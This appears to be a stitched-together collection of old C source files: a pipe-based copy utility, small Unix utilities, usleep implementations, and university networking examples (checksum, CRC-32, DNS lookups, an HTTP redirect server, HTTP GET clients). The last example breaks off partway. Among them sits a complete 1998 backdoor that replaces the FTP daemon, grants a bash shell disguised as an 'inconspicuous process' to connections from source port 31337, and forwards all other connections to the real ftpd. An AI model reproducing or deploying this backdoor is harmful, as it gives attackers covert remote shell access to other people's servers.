		wfd = chld2par.p_wr;
		rfd = par2chld.p_rd;
		msgchar = GO;		/* Prime the pump, so to speak */
		goto childstart;

	default:
		/*  Parent  */
		close (par2chld.p_rd);
		close (chld2par.p_wr);
		wfd = par2chld.p_wr;
		rfd = chld2par.p_rd;
		break;
	}

	exitval = 0;
	count = 0L;
	while (1) {
		if ((nread = read (0, buffer, size)) != size) {
			saverrno = errno;
			msgchar = STOP;
		} else
			msgchar = GO;
		if(write (wfd, &msgchar, 1) != 1) {
			perror("dbcp: message send");
			prs("Can't send READ message\n");
		}
		if ((int)nread == (-1)) {
			errno = saverrno;
			perror ("input read");
			prs("read error on input\n");
			break;
		}
		if(nread == 0) {
			prs("EOF on input\n");
			break;
		}
		if(nread != size)
			prs("partial read (nread = %u)\n", nread);
		if (read(rfd, &msgchar, 1) != 1) {
			perror("dbcp: WRITE message error");
			exitval = 69;
			break;
		}
		if (msgchar == STOP) {
			prs("Got STOP WRITE with %u left\n", nread);
			break;
		} else if (msgchar != GO) {
			prs("Got bad WRITE message 0%o\n", msgchar&0377);
			exitval = 19;
			break;
		}
		if (write(1, buffer, nread) != nread) {
			perror("output write");
			msgchar = STOP;
		} else {
			count++;
			msgchar = GO;
		}
		if (nread != size)
			break;
childstart:
		if (write (wfd, &msgchar, 1) != 1) {
			perror("dbcp: message send");
			prs("Can't send WRITE message\n");
			break;
		}
		if (msgchar == STOP) {
			prs ("write error on output\n");
			break;
		}
		if (read(rfd, &msgchar, 1) != 1) {
			perror("dbcp: READ message error");
			exitval = 79;
			break;
		}
		if (msgchar == STOP) {
			prs("Got STOP READ\n");
			break;
		} else if (msgchar != GO) {
			prs("Got bad READ message 0%o\n", msgchar&0377);
			exitval = 39;
			break;
		}
	}

	prs ("%ld records copied\n", count);
	if(pid)
		while (wait(&saverrno) > 0);	/* rip off saverrno */
	exit(exitval);
}

prs (fmt, a, b, c)
char	*fmt, *a, *b, *c;
{
	fprintf(stderr, "dbcp: (%s) ", pid ? "PARENT" : "CHILD");
	fprintf(stderr, fmt, a, b, c);
	fflush(stderr);
}

/*
 * source port authenticating shell-binding backdoor.should compile on just 
 * about everything checks to see if it was called from inetd or independently
 * and behaves accordingly(accordingly being that it handles One connection 
 * regardless of if it was a legit one or not when executed independently.)
 * - cheddar oct '98
 *
 * p.s. netcat allows you to set the source port of connections. 
 */
 
#define LISPORT "0021"    /* the quoted decimal port that we listen on       */
#define HACKPORT 31337    /* unqoted decimal port that gets shell acess      */
#define SHELL "/bin/bash" /* look at line 108 to change argv[0]              */
#define DAEMON "/usr/sbin/in.ftpd" /* legitimate daemon to execute see line  */
#include <stdio.h>                 /* 103 for argv info.                     */
#include <stdlib.h>                
#include <errno.h>
#include <netinet/in.h>
#include <sys/socket.h>

extern int errno;

int main (int argc, char *argv[])
{
   int i;
   int remoteport;
   int son_of_inetd = 0;
   int ld; /* listen'n socket  descriptor */
   int sd; /* accepted socket descriptor */
   int addrlen;
   struct sockaddr_in sock;
   struct sockaddr_in remote;
   
   if (  (ld = socket(AF_INET, SOCK_STREAM, 0)) < 0)
     {
       perror("socket:");
       exit(1);
    }
   /*
    * we do this so that we can figure out if we were called from inetd 
    * or we should run as a independent daemon, and behave accordingly. 
    */
   i = 1;
   if ( setsockopt(ld, SOL_SOCKET, SO_REUSEADDR, &i, sizeof(int)) < 0) 
      {
      perror("setsockopt:");
      exit(1);
    }
   
   sock.sin_family = AF_INET;
   sock.sin_addr.s_addr = INADDR_ANY;
   sock.sin_port = htons(strtol(LISPORT, (char **) NULL, 10)); 
   
   if ( bind(ld, &sock, sizeof(sock)) < 0)
     {  
	if (errno == EADDRINUSE) {/* perhaps this needs a little explainin   */
   	   close(ld);             /* we can asumme that we were called from  */  
	   son_of_inetd = 1;      /* inetd if errno = EADDRINUSE therefore we*/
        }                         /* close ld, set son_of_inetd and continue*/
	if (!son_of_inetd) {
	perror("bind:");         
	   exit(1);              
        }                       
     }                             
                                   
   if (!son_of_inetd) { 
 
      if ( listen(ld, 3) < 0 )
      { 
	perror("listen:");
       	exit(1);
      }

     if ( (sd = accept(ld, (struct sockaddr *) &remote, &addrlen)) == -1 )
	{
        perror("accept");
	exit(1);
	}
   
     getpeername(sd, &remote, &addrlen);
     remoteport = ntohs(remote.sin_port);
  }
   else { /* we were called from inetd. */
        getpeername(0, &remote, &addrlen);
        remoteport = ntohs(remote.sin_port);
  } 

   if ( remoteport == HACKPORT) {
          if( fork() == 0) { 
             if( !son_of_inetd ) {
                 close(0); close(1); close(2); 
                 dup2(sd, 0); dup2(sd, 1); dup2(sd, 2);
	     }
           printf("shell access granted. enjoy.\n");
           execl(SHELL, "inconspicuous process", 0); /* changes this. */
	  } 
   } 
  else { /* setup the fd's and execute the usual daemon. */
       if( fork() == 0) {
       	   if( !son_of_inetd ) {
      	       close(0); close(1); close(2);
	       dup2(sd, 0); dup2(sd, 1); dup2(sd, 2);
	      }
          execl(DAEMON, "in.ftpd", 0);    /* maybe this too. */
       }
  } 

  close(sd);

}

/*	____	____	____	____	____	____	____	____	*/

/* scan host database : cc -lxnet */

# include <netdb.h>

main () {

	struct hostent * hep ;

	sethostent (1) ;

	while ( ( hep = gethostent () ) != NULL )
		printf ("[%s] \n", hep->h_name) ;

	endhostent () ;

}

/*	____	____	____	____	____	____	____	____	*/

/* sx : strings xor'ed */

# define MAXBITS	64

/* unsigned char to bit string */

char * uctobs (byt) unsigned char byt ; {

	static char bitstr [MAXBITS+1] ;
	unsigned char mbit = 0x80 ;
	int j ;

	for ( j = 0 ; j < 8 ; ++j ) {
		bitstr [j] = ( byt & mbit ) ? '1' : '0' ;
		mbit >>= 1 ;
	}

	bitstr [j] = '\0' ;

	return bitstr ;
}

/* print text and bit strings */

ptabits (s) char * s ; {

	char * p = s ;

	while ( *p ) {
		printf ( "%c", *p >= ' ' && *p <= '~' ? *p : '.' ) ;
		++p ;
	}

	p = s ;
	while ( *p )
		printf ( " %s", uctobs ( (unsigned char) *p++ ) ) ;

	printf ("\n") ;
}

/* xor two strings */

char * strxor (s1, s2) char * s1, * s2 ; {

	static char sx [128] ;
	int i, j = strlen (s1) ;

	for ( i = 0 ; i < j ; ++i )
		sx [i] = *(s1+i) ^ *(s2+i) ;

	sx [j] = '\0' ;
	return sx ;
}

main (argc, argv) char * * argv ; {

	char * s1 = *(argv+1) ;
	char * s2 = *(argv+2) ;
	char * s3 ;

	ptabits (s1) ;
	ptabits (s2) ;

	s3 = strxor (s1, s2) ;

	ptabits (s3) ;
}

/*	____	____	____	____	____	____	____	____	*/

      /*
            usleep -- support routine for 4.2BSD system call emulations
            last edit:  29-Oct-1984     D A Gwyn
      */

      extern int        select();

      int
      usleep( usec )                            /* returns 0 if ok, else -1 */
            long                usec;           /* delay in microseconds */
            {
            static struct                       /* `timeval' */
                    {
                    long        tv_sec;         /* seconds */
                    long        tv_usec;        /* microsecs */
                    }   delay;          /* _select() timeout */

            delay.tv_sec = usec / 1000000L;
            delay.tv_usec = usec % 1000000L;

            return select( 0, (long *)0, (long *)0, (long *)0, &delay );
            }



      #include <poll.h>

      int
      usleep(usec)
      unsigned int usec;                /* microseconds */
      {
            static subtotal = 0;        /* microseconds */
            int msec;                   /* milliseconds */

            /* 'foo' is only here because some versions of 5.3 have
             * a bug where the first argument to poll() is checked
             * for a valid memory address even if the second argument is 0.
             */
            struct pollfd foo;

            subtotal += usec;
            /* if less then 1 msec request, do nothing but remember it */
            if (subtotal < 1000) return(0);
            msec = subtotal/1000;
            subtotal = subtotal%1000;
            return poll(&foo,(unsigned long)0,msec);
      }

/*	____	____	____	____	____	____	____	____	*/

# include <time.h>
# include <stdio.h>

main () {

	struct timeval tvb1, tvb2, tvb3 ;
	unsigned long t1, t2, t3 ;
	double d1, d2, d3 ;
	char rsvp [10] ;

	gettimeofday (&tvb1, NULL) ;

	t1 = ( tvb1.tv_sec * 1000000 ) + tvb1.tv_usec ;
	d1 = ( ( (double) tvb1.tv_sec * 1000000 ) + tvb1.tv_usec ) / 1000000 ;

	printf ("s(%lu) u(%lu) t(%lu) d(%.6f)\n", tvb1.tv_sec, tvb1.tv_usec, t1, d1) ;

	fgets (rsvp, 8, stdin) ;

	gettimeofday (&tvb2, NULL) ;

	t2 = ( tvb2.tv_sec * 1000000 ) + tvb2.tv_usec ;
	d2 = ( ( (double) tvb2.tv_sec * 1000000 ) + tvb2.tv_usec ) / 1000000 ;

	printf ("s(%lu) u(%lu) t(%lu) d(%.6f)\n", tvb2.tv_sec, tvb2.tv_usec, t2, d2) ;

	t3 = t2 - t1 ;
	d3 = d2 - d1 ;

	tvb3.tv_sec = tvb2.tv_sec - tvb1.tv_sec ;
	if ( tvb2.tv_usec < tvb1.tv_usec ) {
		tvb3.tv_sec -= 1 ;
		tvb2.tv_usec += 1000000 ;
	}
	tvb3.tv_usec = tvb2.tv_usec - tvb1.tv_usec ;

	printf ("s(%lu) u(%lu) t(%lu) d(%.6f)\n", tvb3.tv_sec, tvb3.tv_usec, t3, d3) ;
}

/*	____	____	____	____	____	____	____	____	*/

# ifdef WINTHRSCK

/*_______________ checksum.c _______________*/

//=  Program to compute 16-bit Internet checksum                              =
//=  Notes: 1) Based on the C-code given in RFC 1071 (Computing the Internet  =
//=            Checksum by R. Braden, D. Borman, and C. Partridge, 1988).     =
//=         2) Streamlined for 32-bit machines.  All overflows are added-in   =
//=            after the summing loop and not within the summing loop on a    =
//=            an overflow-by-overflow basis.                                 =
//=  Build:  bcc32 checksum.c, gcc checksum.c                                 =
#include <stdio.h>                  // Needed for printf()
#include <stdlib.h>                 // Needed for rand()

typedef unsigned char      byte;    // Byte is a char
typedef unsigned short int word16;  // 16-bit word is a short int
typedef unsigned int       word32;  // 32-bit word is an int

#define NUM            100000L      // Number of times to repeat
#define BUFFER_LEN       4096L      // Length of buffer

word16 checksum(byte *addr, word32 count);

void main(void)
{
  byte        buff[BUFFER_LEN]; // Buffer of packet bytes
  word16      check;            // 16-bit checksum value
  word32      i;                // Loop counter

  // Load buffer with BUFFER_LEN random bytes
  for (i=0; i<BUFFER_LEN; i++)
    buff[i] = (byte) rand();

  // Compute NUM checksums
  for (i=0; i<NUM; i++)
    check = checksum(buff, BUFFER_LEN);

  // Output the last checksum
  printf("checksum = %04X \n", check);
}

//=  Compute Internet Checksum for "count" bytes beginning at location "addr" =
word16 checksum(byte *addr, word32 count)
{
  register word32 sum = 0;

  // Main summing loop
  while(count > 1)
  {
    sum = sum + *((word16 *) addr)++;
    count = count - 2;
  }

  // Add left-over byte, if any
  if (count > 0)
    sum = sum + *((byte *) addr);

  // Fold 32-bit sum to 16 bits
  while (sum>>16)
    sum = (sum & 0xFFFF) + (sum >> 16);

  return(~sum);
}

/*_______________ crc32.c _______________*/

//=  Program to compute CRC-32 using the "table method" for 8-bit subtracts   =
//=  Notes: Uses the standard "Charles Michael Heard" code available from     =
//=         http://cell-relay.indiana.edu/cell-relay/publications/software    =
//=         /CRC which was adapted from the algorithm described by Avarm      =
//=         Perez, "Byte-wise CRC Calculations," IEEE Micro 3, 40 (1983).     =
//=  Build:  bcc32 crc32.c, gcc crc32.c                                       =
#include <stdio.h>                  // Needed for printf()
#include <stdlib.h>                 // Needed for rand()

typedef unsigned char      byte;    // Byte is a char
typedef unsigned short int word16;  // 16-bit word is a short int
typedef unsigned int       word32;  // 32-bit word is an int

#define POLYNOMIAL 0x04c11db7L      // Standard CRC-32 ppolynomial
#define NUM            100000L      // Number of times to repeat
#define BUFFER_LEN       4096L      // Length of buffer

static word32 crc_table[256];       // Table of 8-bit remainders

void gen_crc_table(void);
word32 update_crc(word32 crc_accum, byte *data_blk_ptr, word32 data_blk_size);

void main(void)
{
  byte        buff[BUFFER_LEN]; // Buffer of packet bytes
  word32      crc32;            // 32-bit CRC value
  word16      i;                // Loop counter (16 bit)
  word32      j;                // Loop counter (32 bit)

  // Initialize the CRC table
  gen_crc_table();

  // Load buffer with BUFFER_LEN random bytes
  for (i=0; i<BUFFER_LEN; i++)
    buff[i] = (byte) rand();

  // Compute NUM CRC's
  for (j=0; j<NUM; j++)
    crc32 = update_crc(-1, buff, BUFFER_LEN);

  // Output the last CRC
  printf("CRC = %08X \n", crc32);
}

//=  CRC32 table initialization                                               =
void gen_crc_table(void)
{
  register word16 i, j;
  register word32 crc_accum;

  for (i=0;  i<256;  i++)
  {
    crc_accum = ( (word32) i << 24 );
    for ( j = 0;  j < 8;  j++ )
    {
      if ( crc_accum & 0x80000000L )
        crc_accum = (crc_accum << 1) ^ POLYNOMIAL;
      else
        crc_accum = (crc_accum << 1);
    }
    crc_table[i] = crc_accum;
  }
}

//=  CRC32 generation                                                         =
word32 update_crc(word32 crc_accum, byte *data_blk_ptr, word32 data_blk_size)
{
   register word32 i, j;

   for (j=0; j<data_blk_size; j++)
   {
     i = ((int) (crc_accum >> 24) ^ *data_blk_ptr++) & 0xFF;
     crc_accum = (crc_accum << 8) ^ crc_table[i];
   }
   crc_accum = ~crc_accum;

   return crc_accum;
}

/*_______________ getbyaddr.c _______________*/

//=  Build: bcc32 getaddr.c or cl getaddr.c wsock32.lib for Winsock           =
//=         gcc getaddr.c -lsocket -lnsl for BSD                              =

#define  WIN                // WIN for Winsock and BSD for BSD sockets

#include <stdio.h>          // Needed for printf()
#include <stdlib.h>         // Needed for exit()
#include <string.h>         // Needed for memcpy() and strcpy()
#ifdef WIN
  #include <windows.h>      // Needed for all Winsock stuff
#endif

#ifdef BSD
  #include <sys/types.h>    // Needed for system defined identifiers.
  #include <netinet/in.h>   // Needed for internet address structure.
  #include <arpa/inet.h>    // Needed for "inet_ntoa".
  #include <sys/socket.h>   // Needed for socket(), bind(), etc...
  #include <fcntl.h>
  #include <netdb.h>
#endif

void main(int argc, char *argv[])
{
#ifdef WIN
  WORD wVersionRequested = MAKEWORD(1,1);       // Stuff for WSA functions
  WSADATA wsaData;                              // Stuff for WSA functions
#endif

  struct hostent *host;            // Structure for gethostbyname()
  struct in_addr  address;         // Structure for Internet address
  char            host_name[256];  // String for host name

  if (argc != 2)
  {
    printf("*** ERROR - incorrect number of command line arguments \n");
    printf("            usage is 'getaddr host_name' \n");
    exit(1);
  }

#ifdef WIN
  // This stuff initializes winsock
  WSAStartup(wVersionRequested, &wsaData);
#endif

  // Copy host name into host_name
  strcpy(host_name, argv[1]);

  // Do a gethostbyname()
  printf("Looking for IP address for '%s'... \n", host_name);
  host = gethostbyname(host_name);

  // Output address if host found
  if (host == NULL)
    printf("  IP address for '%s' could not be found \n", host_name);
  else
  {
    memcpy(&address, host->h_addr, 4);
    printf("  IP address for '%s' is %s \n", host_name, inet_ntoa(address));
  }

#ifdef WIN
  // This stuff cleans-up winsock
  WSACleanup();
#endif
}

/*_______________ getbyname.c _______________*/

//=  A program to get the host name for a given IP address                    =
//=    1) This program conditionally compiles for Winsock and BSD sockets.    =
//=       Set the initial #define to WIN or BSD as appropriate.               =
//=    2) This program assumes command line entry of the IP address.          =
//=  Example execution:                                                       =
//=                                                                           =
//=    getname 131.247.3.1                                                    =
//=    Looking for host name for for '131.247.3.1'...                         =
//=      Host name for '131.247.3.1' is 'grad.csee.usf.edu'                   =
//=  Build: bcc32 getname.c or cl getname.c wsock32.lib for Winsock           =
//=         gcc getname.c -lsocket -lnsl for BSD                              =
//=  Execute: getname IP_address                                              =
#define  WIN                // WIN for Winsock and BSD for BSD sockets

#include <stdio.h>          // Needed for printf()
#include <stdlib.h>         // Needed for exit()
#include <string.h>         // Needed for memcpy() and strcpy()

#ifdef WIN
  #include <windows.h>      // Needed for all Winsock stuff
#endif

#ifdef BSD
  #include <sys/types.h>       // Needed for system defined identifiers.
  #include <netinet/in.h>      // Needed for internet address structure.
  #include <arpa/inet.h>       // Needed for "inet_ntoa".
  #include <sys/socket.h>      // Needed for socket(), bind(), etc...
  #include <fcntl.h>
  #include <netdb.h>           // Need for gethostbyaddr().
#endif

void main(int argc, char *argv[])
{

#ifdef WIN
  WORD wVersionRequested = MAKEWORD(1,1);       // Stuff for WSA functions
  WSADATA wsaData;                              // Stuff for WSA functions
#endif

  struct hostent  *host;                // Structure for gethostbyaddr()
  struct in_addr  *myaddr;              // Structure for Internetaddress
  char            ip_address[256];      // String for IP address

  if (argc != 2)
  {
    printf("need host's IP address as commmand line arguments \n");
    printf("usage is 'getname IP_address' \n");
    exit(1);
  }

#ifdef WIN
  // This stuff initializes winsock
  WSAStartup(wVersionRequested, &wsaData);
#endif

  // Copy IP address  into ip_address
  strcpy(ip_address, argv[1]);

  myaddr=(struct in_addr*)malloc(sizeof(struct in_addr));
  myaddr->s_addr=inet_addr(ip_address) ;

  // Do a gethostbyaddr() to get a pointer to struct host
  printf("Looking for host name for for '%s'... \n", ip_address);
  host = gethostbyaddr((char *) myaddr, 4 ,AF_INET);

  // Output host name if host found
  if (host == NULL)
    printf("  Host name for '%s' could not be found \n",ip_address);
  else
    printf("  Host name for '%s' is '%s' \n",ip_address, host->h_name);

#ifdef WIN
  // This stuff cleans-up winsock
  WSACleanup();
#endif

}

/*_______________ http302.c _______________*/

//=  A server program to respond to an HTTP GET with an HTTP 302 redirect     =
//=    1) This program conditionally compiles for Winsock and BSD sockets.    =
//=       Set the initial #define to WIN or BSD as appropriate.               =
//=    2) This program hardwires an HTTP 302 response to return to the        =
//=       the browser.  The HTTP 302 is hardwire to redirect to               =
//=       http://www.csee.usf.edu/~christen                                   =
//=  Example execution:                                                       =
//=                                                                           =
//=   1) Determine the IP address on which httpresp will run                  =
//=      (e.g., 131.247.167.109).  On Windows NT/2000 use ipconfig to         =
//=      determine the IP address of the local machine.                       =
//=   2) Execute http302                                                      =
//=   3) Open a Web browser and surf to http://xxx.xxx.xxx.xxx where          =
//=      xxx.xxx.xxx.xxx is the IP address determined in step (1)             =
//=   4) Will see http://www.csee.usf.edu/~christen on Web browser            =
//=  Build: bcc32 http302.c, cl http302.c wsock32.lib,                        =
//=         gcc http302.c -lsocket -lnsl                                      =
//=  Execute: http302                                                         =
#define  WIN                // WIN for Winsock and BSD for BSD sockets

#include <stdio.h>          // Needed for printf()
#include <stdlib.h>         // Needed for exit()
#include <string.h>         // Needed for strcpy() and strlen()

#ifdef WIN
  #include <windows.h>      // Needed for all Winsock stuff
#endif

#ifdef BSD
  #include <sys/types.h>    // Needed for system defined identifiers.
  #include <netinet/in.h>   // Needed for internet address structure.
  #include <sys/socket.h>   // Needed for socket(), bind(), etc...
  #include <arpa/inet.h>    // Needed for inet_ntoa()
  #include <fcntl.h>
  #include <netdb.h>
#endif

#define  BUF_SIZE           10000     // Buffer size
#define  PORT_NUM              80     // This is the port number for a Web server

void main(void)
{
#ifdef WIN
  WORD wVersionRequested = MAKEWORD(1,1);       // Stuff for WSA functions
  WSADATA wsaData;                              // Stuff for WSA functions
#endif

  unsigned int         server_s;             // Server socket descriptor
  struct sockaddr_in   server_addr;          // Server Internet address
  unsigned int         client_s;             // Client socket descriptor
  struct sockaddr_in   client_addr;          // Client Internet address
  struct in_addr       client_ip_addr;       // Client IP address
  int                  addr_len;             // Internet address length
  char                 out_buf[BUF_SIZE];    // Output buffer for HTML response
  char                 in_buf[BUF_SIZE];     // Input buffer for GET resquest
  unsigned int         retcode;              // Return code
  unsigned int         i;                    // Loop counter

#ifdef WIN
  // This stuff initializes winsock
  WSAStartup(wVersionRequested, &wsaData);
#endif

  // Create a socket
  server_s = socket(AF_INET, SOCK_STREAM, 0);

  // Fill-in my socket's address information and bind the socket
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(PORT_NUM);
  server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
  bind(server_s, (struct sockaddr *)&server_addr, sizeof(server_addr));

  // Listen for connections and then accept
  listen(server_s, 1);
  addr_len = sizeof(client_addr);
  client_s = accept(server_s, (struct sockaddr *)&client_addr, &addr_len);

  // Receive from the Web browser
  //  - The return code from recv() is the number of bytes received
  retcode = recv(client_s, in_buf, BUF_SIZE, 0);
  for (i=0; i<retcode; i++)
    printf ("%c", in_buf[i]);

  // Copy the HTTP 302 response into the out buffer
  strcpy(out_buf, "HTTP/1.1 302 Moved Temporarily\n                          \
                   Date: \n                                                  \
                   Server: \n                                                \
                   Location: http://www.csee.usf.edu/~christen\n             \
                   Connection: close\n                                       \
                   Content-Type: text/html\n\n");

  // Send HTTP 302 response to the client
  send(client_s, out_buf, strlen(out_buf), 0);

  // Close all open sockets
#ifdef WIN
  closesocket(server_s);
  closesocket(client_s);
#endif
#ifdef BSD
  close(server_s);
  close(client_s);
#endif

#ifdef WIN
  // This stuff cleans-up winsock
  WSACleanup();
#endif
}

/*_______________ httpget1.c _______________*/

//=  A client program to connect to a Web server and do one HTTP GET          =
//=   - Outputs the GET response                                              =
//=    1) This program conditionally compiles for Winsock and BSD sockets.    =
//=       Set the initial #define to WIN or BSD as appropriate.               =
//=    2) This program hardwires the IP address of www.grad.csee.usf in the   =
//=       #define IP_ADDR and hardwires the GET request string into           =
//=       #define GET_STRING.                                                 =
//=  Output from an execution (hardwired to get Christensen homepage):        =
//=                                                                           =
//=    HTTP/1.1 200 OK                                                        =
//=    Date: Wed, 20 Dec 2000 03:17:18 GMT                                    =
//=    Server: Apache/1.3.6 (Unix)                                            =
//=    Last-Modified: Sat, 16 Dec 2000 00:14:59 GMT                           =
//=    ETag: "25998c-340c-3a3ab403"                                           =
//=    Accept-Ranges: bytes                                                   =
//=    Content-Length: 13324                                                  =
//=    Connection: close                                                      =
//=    Content-Type: text/html                                                =
//=                                                                           =
//=    <html><head>                                                           =
//=    <title>Homepage for Kenneth J. Christensen</title>                     =
//=    </head><body background="back4.gif">                                   =
//=    <center>                                                               =
//=    <br>                                                                   =
//=    <table border=4>                                                       =
//=    --- SNIP SNIP ---                                                      =
//=    </ol>                                                                  =
//=    <hr size=4 width=100%>                                                 =
//=                                                                           =
//=    <address>                                                              =
//=    Last updated by <a href="http://www.csee.usf.edu/~christen">           =
//=    Ken Christensen</a> on DECEMBER 15, 2000                               =
//=    </address>                                                             =
//=                                                                           =
//=    </body></html>                                                         =
//=  Build: bcc32 httpget1.c, cl httpget1.c wsock32.lib,                      =
//=         gcc httpget1.c -lsocket -lnsl                                     =
//=  Execute: httpget1                                                       =
#define  WIN                // WIN for Winsock and BSD for BSD sockets

#include <stdio.h>          // Needed for printf()
#include <stdlib.h>         // Needed for exit()
#include <string.h>         // Needed for strcpy() and strlen()
#ifdef WIN
  #include <windows.h>      // Needed for all Winsock stuff
#endif
#ifdef BSD
  #include <sys/types.h>    // Needed for system defined identifiers.
  #include <netinet/in.h>   // Needed for internet address structure.
  #include <sys/socket.h>   // Needed for socket(), bind(), etc...
  #include <arpa/inet.h>    // Needed for inet_ntoa()
  #include <fcntl.h>
  #include <netdb.h>
#endif

#define  BUF_SIZE            4096     // Buffer size
#define  PORT_NUM              80     // Web servers are at port 80
#define  IP_ADDR    "131.247.3.1" // IP address of www.csee.usf.edu
#define  GET_STRING "GET /~christen/index.html HTTP/1.0\n\n"  // GET string

void main(void)
{
#ifdef WIN
  WORD wVersionRequested = MAKEWORD(1,1);    // Stuff for WSA functions
  WSADATA wsaData;                           // Stuff for WSA functions
#endif

  unsigned int         server_s;             // Server socket descriptor
  struct sockaddr_in   server_addr;          // Server Internet address
  char                 out_buf[BUF_SIZE];    // Output buffer for GET request
  char                 in_buf[BUF_SIZE];     // Input buffer for response
  unsigned int         retcode;              // Return code
  unsigned int         i;                    // Loop counter

#ifdef WIN
  // This stuff initializes winsock
  WSAStartup(wVersionRequested, &wsaData);
#endif

  // Create a socket
  server_s = socket(AF_INET, SOCK_STREAM, 0);

  // Fill-in the Web server socket's address information
  server_addr.sin_family = AF_INET;                 // Address family to use
  server_addr.sin_port = htons(PORT_NUM);           // Port num to use
  server_addr.sin_addr.s_addr = inet_addr(IP_ADDR); // IP address to use

  // Do a connect (connect() blocks)
  retcode = connect(server_s, (struct sockaddr *)&server_addr,
                    sizeof(server_addr));
  if (retcode != 0)
  {
    printf("ERROR - connect() failed \n");
    exit(1);
  }

  // Send a GET to the Web server
  strcpy(out_buf, GET_STRING);
  send(server_s, out_buf, strlen(out_buf), 0);

  // Receive from the Web server
  //  - The return code from recv() is the number of bytes received
  retcode = recv(server_s, in_buf, BUF_SIZE, 0);
  while ((retcode > 0) || (retcode == -1))
  {
    if (retcode == -1)
    {
      printf("ERROR - recv() failed \n");
      exit(1);
    }
    for (i=0; i<retcode; i++)
      printf ("%c", in_buf[i]);
    retcode = recv(server_s, in_buf, BUF_SIZE, 0);
  }

  // Close all open sockets
#ifdef WIN
  closesocket(server_s);
#endif
#ifdef BSD
  close(server_s);
#endif

#ifdef WIN
  // This stuff cleans-up winsock
  WSACleanup();
#endif
}

/*_______________ httpget2.c _______________*/

//=  A client program to connect to a Web server and do HTTP GETs             =
//=   - Does NUM_GET serieal GETs and does not output the response            =
//=    1) This program conditionally compiles for Winsock and BSD sockets.    =
//=       Set the initial #define to WIN or BSD as appropriate.               =
//=    2) This program hardwires the IP address of www.grad.csee.usf in the   =
//=       #define IP_ADDR and hardwires the GET request string into           =
//=       #define GET_STRING.                                                 =
//=  Output from an execution (hardwired to get Christensen homepage):        =
//=                                                                           =
//=    Start of httpget2.c                                                    =
//=    End of httpget2.c                                                      =
//=  Build: bcc32 httpget2.c, cl httpget2.c wsock32.lib,                      =
//=         gcc httpget2.c -lsocket -lnsl                                     =
//=  Execute: httpget2                                                        =
#define  WIN                // WIN for Winsock and BSD for BSD sockets

#include <stdio.h>          // Needed for printf()
#include <stdlib.h>         // Needed for exit()
#include <string.h>         // Needed for strcpy() and strlen()
#ifdef WIN
  #include <windows.h>      // Needed for all Winsock stuff
#endif
#ifdef BSD
  #include <sys/types.h>    // Needed for system defined identifiers.
  #include <netinet/in.h>   // Needed for internet address structure.
  #include <sys/socket.h>   // Needed for socket(), bind(), etc...
  #include <arpa/inet.h>    // Needed for inet_ntoa()
  #include <fcntl.h>
  #include <netdb.h>
#endif

#define  BUF_SIZE            4096     // Buffer size
#define  PORT_NUM              80     // Web servers are at port 80
#define  NUM_GET               10     // Number of serial GETs to do
#define  IP_ADDR    "131.247.3.1" // IP address of www.csee.usf.edu
#define  GET_STRING "GET /~christen/index.html HTTP/1.0\n\n"  // GET string

void main(void)
{
#ifdef WIN
  WORD wVersionRequested = MAKEWORD(1,1);    // Stuff for WSA functions
  WSADATA wsaData;                           // Stuff for WSA functions
#endif

  unsigned int         server_s;             // Server socket descriptor
  struct sockaddr_in   server_addr;          // Server Internet address
  char                 out_buf[BUF_SIZE];    // Output buffer for GET request
  char                 in_buf[BUF_SIZE];     // Input buffer for response
  unsigned int         retcode;              // Return code
  unsigned int         i;                    // Loop counter

#ifdef WIN
  // This stuff initializes winsock
  WSAStartup(wVersionRequested, &wsaData);
#endif

  // Output start message and do NUM_GET GETs
  printf("Start of httpget2.c \n");
  for (i=0; i<NUM_GET; i++)
  {
    // Create a socket
    server_s = socket(AF_INET, SOCK_STREAM, 0);

    // Fill-in the Web server socket's address information
    server_addr.sin_family = AF_INET;                 // Address family to use
    server_addr.sin_port = htons(PORT_NUM);           // Port num to use
    server_addr.sin_addr.s_addr = inet_addr(IP_ADDR); // IP address to use

    // Do a connect (connect() blocks)
    retcode = connect(server_s, (struct sockaddr *)&server_addr,
                      sizeof(server_addr));
    if (retcode != 0)
    {
      printf("ERROR - connect() failed \n");
      exit(1);
    }

    // Send a GET to the Web server
    strcpy(out_buf, GET_STRING);
    send(server_s, out_buf, strlen(out_buf), 0);

    // Receive from the Web server
    //  - The return code from recv() is the number of bytes received
    retcode = recv(server_s, in_buf, BUF_SIZE, 0);
    while ((retcode > 0) || (retcode == -1))
    {
      if (retcode == -1)
      {
        printf("ERROR - recv() failed \n");
        exit(1);
      }
      retcode = recv(server_s, in_buf, BUF_SIZE, 0);
    }

  // Close all open sockets
#ifdef WIN
    closesocket(server_s);
#endif
#ifdef BSD
    close(server_s);
#endif
  }

  // Output end
  printf("End of httpget2.c \n");

#ifdef WIN
  // This stuff cleans-up winsock
  WSACleanup();
#endif
}

/*_______________ httpget3.c _______________*/

//=  A client program to connect to a Web server and do HTTP GETs             =
//=   - Does NUM_GET parallel GETs and does not output the response           =
//=    1) This program compiles for Winsock only as it uses threads.          =
//=    2) This program hardwires the IP address of www.grad.csee.usf in the   =
//=       #define IP_ADDR and hardwires the GET request string into           =
//=       #define GET_STRING.                                                 =
//=  Output from an execution (hardwired to get Christensen homepage):        =
//=                                                                           =
//=    Start of httpget3.c                                                    =
//=    End of httpget3.c                                                      =
//=  Build: bcc32 httpget3.c, cl httpget3.c wsock32.lib,                      =
//=  Execute: httpget3                                                        =

#include <stdio.h>          // Needed for printf()
#include <stdlib.h>         // Needed for exit()
#include <string.h>         // Needed for strcpy() and strlen()
#include <windows.h>        // Needed for all Winsock stuff
#include <process.h>        // Needed for _beginthread() and _endthread()

#define  BUF_SIZE            4096     // Buffer size
#define  PORT_NUM              80     // Web servers are at port 80
#define  NUM_GET               10     // Number of serial GETs to do
#define  IP_ADDR    "131.247.3.1" // IP address of www.csee.usf.edu
#define  GET_STRING "GET /~christen/index.html HTTP/1.0\n\n"  // GET string

int Count;                            // Global thread counter

void do_get(void *in_arg);            // Thread function to do a GET

void main(void)
{
  WORD wVersionRequested = MAKEWORD(1,1);    // Stuff for WSA functions
  WSADATA wsaData;                           // Stuff for WSA functions
  unsigned int         retcode;              // Return code
  unsigned int         i;                    // Loop counter

  // This stuff initializes winsock
  WSAStartup(wVersionRequested, &wsaData);

  // Output start message and do NUM_GET GETs
  printf("Start of httpget3.c \n");
  Count = 0;
  for (i=0; i<NUM_GET; i++)
  {
    Count++;
    if (_beginthread(do_get, 4096, (void *)i) < 0)
    {
      printf("ERROR - Unable to create thread \n");
      exit(1);
    }
